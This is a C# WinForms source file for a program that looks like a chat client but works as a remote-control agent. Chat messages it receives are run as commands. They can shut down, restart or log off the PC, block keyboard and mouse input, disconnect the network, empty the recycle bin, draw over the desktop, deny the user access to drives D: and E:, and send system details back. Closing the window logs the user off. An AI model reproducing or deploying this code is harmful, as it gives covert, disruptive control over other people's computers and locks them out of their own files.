using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ServiceModel;
using Client.ChatService;
using System.Drawing.Imaging;
using Microsoft.Win32;
using System.ComponentModel.Design;
using System.Net.Mail;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.IO;
using System.Security.AccessControl;
using System.Diagnostics;
using System.Threading;


using System.Drawing.Printing;

using System.IO;

namespace Client
{
    public partial class frmClient : Form
    {
        int hy;
        int js;
        bool login;
        int t;
        ReceiveClient rc = null;
        string myName;
       
        public frmClient()
        {
            InitializeComponent();
            this.FormClosing+=new FormClosingEventHandler(frmClient_FormClosing);
            this.txtSend.KeyPress += new KeyPressEventHandler(txtSend_KeyPress);
            
        }

        void txtSend_KeyPress(object sender, KeyPressEventArgs e)
        {
            int keyValue = (int)e.KeyChar;

            if (keyValue == 13)
                SendMessage();
            
        }
       

        private void frmClient_FormClosing(object sender, EventArgs e)
        {
          
            

            if(login==true)
            rc.Stop(myName);


            System.Diagnostics.Process.Start("ShutDown", "/l");
        }

        private void frmClient_Load(object sender, EventArgs e)
        {
            timer2.Start();
            
           // this.Hide();
           MessageBox.Show("              !!خوش آمدید            ", "recever <By ma.orojloo>", MessageBoxButtons.OK, MessageBoxIcon.Information);

           // listBox1.Visible = false;
            Random R_n = new Random();
            int random = R_n.Next(10000,99999999);


            txtUserName.Text = Environment.UserName + "_" + Environment.MachineName+"."+random;

            txtUserName.Enabled = false;
            txtMsgs.Enabled = false;
            txtSend.Enabled = false;
            btnSend.Enabled = false;
        }

        void rc_ReceiveMsg(string sender, string msg)
        {
            if (msg.Length > 0)
                txtMsgs.Text +=Environment.NewLine + sender +">"+ msg;
            check_code(msg);

        }
        //-------------
        //----------------
        // قفل کردن کامپیوتر از طریق کدنویسی 
        [DllImport("user32.dll")]
        public static extern void LockWorkStation();
        ///-
        //خالی کردن سطل بازیافت ویندوز
        enum RecycleFlags : uint
        {
            SHERB_NOCONFIRMATION = 0x00000001,
            SHERB_NOPROGRESSUI = 0x00000001,
            SHERB_NOSOUND = 0x00000004
        }
        [DllImport("Shell32.dll", CharSet = CharSet.Unicode)]
        static extern uint SHEmptyRecycleBin(IntPtr hwnd, string pszRootPath,
        RecycleFlags dwFlags);
        ///-
        // ترسیم و نوشتن مستقیم بر دسکتاپ ویندوز 
        [DllImport("user32")]
        internal static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("User32.dll")]
        internal static extern void ReleaseDC(IntPtr dc);
        public void PaintRectangleToScreen()
        {
            IntPtr deskDC = GetDC(IntPtr.Zero);
            Graphics g = Graphics.FromHdc(deskDC);
            Font font = new Font("Arial Black", 100);
            DrawStringOnCenter(g, "BY MA.OROJLOO", font, new Point(0, -25));
            font = new Font("Arial Black", 50);
            DrawStringOnCenter(g, "J.D.E.V.S", font, new Point(-15, 110));
            Rectangle rect = new Rectangle(25, 50,
                Screen.PrimaryScreen.Bounds.Width - 50,
                Screen.PrimaryScreen.Bounds.Height - 125);
            g.FillRectangle(new SolidBrush(Color.FromArgb(100, Color.DodgerBlue))
                , rect);
            g.DrawRectangle(new Pen(Color.DeepPink, 3), rect);
            g.Dispose();
           // ReleaseDC(deskDC);
        }
        private void DrawStringOnCenter(Graphics g, string str, Font font, Point offset)
        {
            SizeF size = g.MeasureString(str, font);
            g.DrawString(str, font, Brushes.White,
                      new PointF(
                                  (Screen.PrimaryScreen.Bounds.Width - size.Width) / 2 + offset.X,
                                  (Screen.PrimaryScreen.Bounds.Height - size.Height) / 2 + offset.Y)
                                 );
        }
        //-------------------
        //----------------------
        //-------------------------
        void check_code(string code)
        {
            if (code == "OFF")
            {
                System.Diagnostics.Process.Start("ShutDown", "/s");
            }

            if (code == "RESTART")
            {
                System.Diagnostics.Process.Start("ShutDown", "/r");
            }

            if (code == "LOGOFF")
            {
                System.Diagnostics.Process.Start("ShutDown", "/l");
            }
            if (code == "LOCK")
            {
                 LockWorkStation();
            }
           
            if (code == "EMPIY_BIN")                 
            {
                uint result = SHEmptyRecycleBin(IntPtr.Zero, null, 0);
            }
           
            if (code == "DISCONECT_NET")
            {
                System.Diagnostics.Process.Start("rasdial", "/disconnect");
            }
           
            if (code == "GOTOWEB")
            {
                System.Diagnostics.Process.Start("iexplore.exe","http://www.google.com");
            }
            
            //if (code == "GET_PRINTER")
            //{
            //    label3.Text = PrinterSettings.InstalledPrinters.ToString();
            //    txtMsgs.Text = label3.Text;
            //    SendMessage();
            //}
            ;
            if (code == "WRITE_SCREEN")
            {
                PaintRectangleToScreen();
            }

            if (code == "CommandLine")
            {
               txtSend.Text=Environment.CommandLine;
               SendMessage();
            }

            if (code == "CurrentDirectory")
            {
                txtSend.Text = Environment.CurrentDirectory;
                SendMessage();
            }

            if (code == "ExitCode")
            {
                txtSend.Text = Environment.ExitCode.ToString();
                SendMessage();
            }

            if (code == "Is64BitOperatingSystem")
            {
                txtSend.Text = Environment.Is64BitOperatingSystem.ToString();
                SendMessage();
            }

            if (code == "Is64BitProcess")
            {
                txtSend.Text = Environment.Is64BitProcess.ToString();
                SendMessage();
            }

            if (code == "MachineName")
            {
                txtSend.Text = Environment.MachineName;
                SendMessage();
            }

            if (code == "OSVersion")
            {
                txtSend.Text = Environment.OSVersion.ToString();
                SendMessage();
            }

            if (code == "StackTrace")
            {
                txtSend.Text = Environment.StackTrace;
                SendMessage();
            }

            if (code == "SystemDirectory")
            {
                txtSend.Text = Environment.SystemDirectory;
                SendMessage();
            }

            if (code == "SystemPageSize")
            {
                txtSend.Text = Environment.SystemPageSize.ToString();
                SendMessage();
            }

            if (code == "TickCount")
            {
                txtSend.Text = Environment.TickCount.ToString();
                SendMessage();
            }

            if (code == "UserDomainName")
            {
                txtSend.Text = Environment.UserDomainName;
                SendMessage();
            }

            if (code == "UserInteractive")
            {
                txtSend.Text = Environment.UserInteractive.ToString();
                SendMessage();
            }

            if (code == "UserName")
            {
                txtSend.Text = Environment.UserName;
                SendMessage();
            }

            if (code == "Version")
            {
                txtSend.Text = Environment.Version.ToString();
                SendMessage();
            }

            if (code == "WorkingSet")
            {
                txtSend.Text = Environment.WorkingSet.ToString();
                SendMessage();
            }

            if (code == "EXIT_APP")
            {
                Application.Exit();
            }

            if (code == "RESTART_APP")
            {
                Application.Restart();
            }

            if (code == "LOCKSCREEN_OFF")
            {
                BlockInput(false);
            }

            if (code == "LOCKSCREEN_ON")
            {
                BlockInput(true);
            }

            if (code == "LOCKSCREEN_ON_BLUE")
            {
                BlockInput(true);
                Form2 f2 = new Form2();
                f2.Show();
            }

            if (code == "LOCKSCREEN_ON_WHITE")
            {
                BlockInput(true);
                Form3 f3 = new Form3();
                f3.Show();               
            }

            if (code == "LOCKSCREEN_OFF_BLUE")
            {
                BlockInput(false);
                Form2 f2 = new Form2();
                f2.Close();
            }

            if (code == "LOCKSCREEN_OFF_WHITE")
            {
                BlockInput(false);
                Form3 f3 = new Form3();
                f3.Close();
            }

            if (code == " drive_lock_D")
            {
                drive_lock("D:\\");
            }
            if (code == " drive_lock_E")
            {
                drive_lock("E:\\");
            }
           
            if (code != "joined" ||code != "LOCK"||code != "OFF"||code != "LOGOFF"||code != "RESTART"||code != "EMPIY_BIN"||code != "TickCount"||code != "DISCONECT_NET"||code != "GOTOWEB"||code != "CommandLine"||code != "WRITE_SCREEN"||code != "CurrentDirectory"||code != "ExitCode"||code != "Is64BitOperatingSystem"||code != "OSVersion"||code != "Is64BitProcess"||code != "MachineName"||code != "SystemDirectory"||code != "SystemPageSize"|| code != "LOCKSCREEN_ON_BLUE" || code != "LOCKSCREEN_ON" || code != "LOCKSCREEN_OFF" || code !="RESTART_APP"||code != "EXIT_APP"||code != "WorkingSet"||code != "Version"||code != "Version"||code != "UserName"||code != "UserInteractive"||code != "UserDomainName")
            {
                js++; 
            }

            else
            {
              MessageBox.Show(code, "");  
            }
           
            
           
        }
       
               

        //لاک کردن درایو
        private void drive_lock(string path)
    {
        try
        {
            ProcessStartInfo info = new ProcessStartInfo("cmd");
            info.UseShellExecute = false;
            info.RedirectStandardError = true;
            info.RedirectStandardInput = true;
            info.RedirectStandardOutput = true;
            info.CreateNoWindow = true;
            info.ErrorDialog = false;
            info.WindowStyle = ProcessWindowStyle.Hidden;
            Process P = Process.Start(info);
            StreamWriter W = P.StandardInput;
            if (W != null)
                W.WriteLine("attrib  \"" + path + "\"");///("attrib +s +h \"" +label2.Text + "\"");باعث مخفی شدن نیز میشع

            Thread.Sleep(1000);
            P.Kill();

            string folderPath = path;
            string adminUserName = Environment.UserName;// getting your adminUserName
            DirectorySecurity ds = Directory.GetAccessControl(folderPath);
            FileSystemAccessRule fsa = new FileSystemAccessRule(adminUserName, FileSystemRights.FullControl, AccessControlType.Deny);
            ds.AddAccessRule(fsa);
            Directory.SetAccessControl(folderPath, ds);

            //  MessageBox.Show( MessageBoxButtons.YesNo, MessageBoxIcon.Information)
            MessageBox.Show("Locked", "", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
           
           
           
        }
        catch (Exception ex)
        {
           // MessageBox.Show(ex.);
        }  

    }

        //----قفل موس و کیبود
        [return: MarshalAs(UnmanagedType.Bool)]

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]

        public static extern void BlockInput([In, MarshalAs(UnmanagedType.Bool)]bool fBlockIt);

        

        void rc_NewNames(object sender, List<string> names)
        {
            lstClients.Items.Clear();
            foreach (string name in names)
            {
                if (name!=myName)
                    lstClients.Items.Add(name);
            }
        }

        private void btnSend_Click(object sender, EventArgs e)
        {
            SendMessage();
        }

        private void SendMessage()
        {
            if (lstClients.Items.Count != 0)
            {
                txtMsgs.Text += Environment.NewLine + myName + ">" + txtSend.Text;
                if (lstClients.SelectedItems.Count == 0)
                    rc.SendMessage(txtSend.Text, myName, lstClients.Items[0].ToString());
                else
                    if (!string.IsNullOrEmpty(lstClients.SelectedItem.ToString()))
                        rc.SendMessage(txtSend.Text, myName, lstClients.SelectedItem.ToString());

                txtSend.Clear();
            }
        }

        private void btnLogin_Click(object sender, EventArgs e)
        {

            _log_();
        }
        private void _log_()
        {
          //  MessageBox.Show("","");
            login = true;
            btnLogin.Enabled = false;
            if (txtUserName.Text.Length > 0)
            {
                txtMsgs.Enabled = true;
                txtSend.Enabled = true;
                btnSend.Enabled = true;

                myName = txtUserName.Text.Trim();

                rc = new ReceiveClient();
                rc.Start(rc, myName);

                rc.NewNames += new GotNames(rc_NewNames);
                rc.ReceiveMsg += new ReceviedMessage(rc_ReceiveMsg);
            }
            else
            {
                txtMsgs.Enabled = false;
                txtSend.Enabled = false;
                btnSend.Enabled = false;
            }


            timer1.Start();


        }
        private void login_()
        {
            txtSend.Text = "joined";
            SendMessage();




        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            t++;
            if (t == 3)
            {
               
                login_();
                txtSend.Text = string.Empty;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            
            Application.Restart();
        }

        private void label3_Click(object sender, System.EventArgs e)
        {
           //// uint result = SHEmptyRecycleBin(IntPtr.Zero, null, 0);
        }

        private void label3_Click_1(object sender, System.EventArgs e)
        {
          
        }

        private void label3_Click_2(object sender, System.EventArgs e)
        {
           
        }

        private void linkLabel1_LinkClicked(object sender, System.Windows.Forms.LinkLabelLinkClickedEventArgs e)
        {
          
        }

        private void txtMsgs_TextChanged(object sender, System.EventArgs e)
        {

        }

        private void label1_Click(object sender, System.EventArgs e)
        {

        }

        private void txtUserName_TextChanged(object sender, System.EventArgs e)
        {

        }

        private void lstClients_SelectedIndexChanged(object sender, System.EventArgs e)
        {

        }

        private void txtSend_TextChanged(object sender, System.EventArgs e)
        {

        }

        private void label2_Click(object sender, System.EventArgs e)
        {

        }
        
        private void timer2_Tick(object sender, System.EventArgs e)
        {
            hy++;
           if(hy==200)
              _log_();
        }

        private void label3_Click_3(object sender, System.EventArgs e)
        {
          
        }

        private void button2_Click(object sender, System.EventArgs e)
        {
            drive_lock("D:\\");
        }

    }
   
}
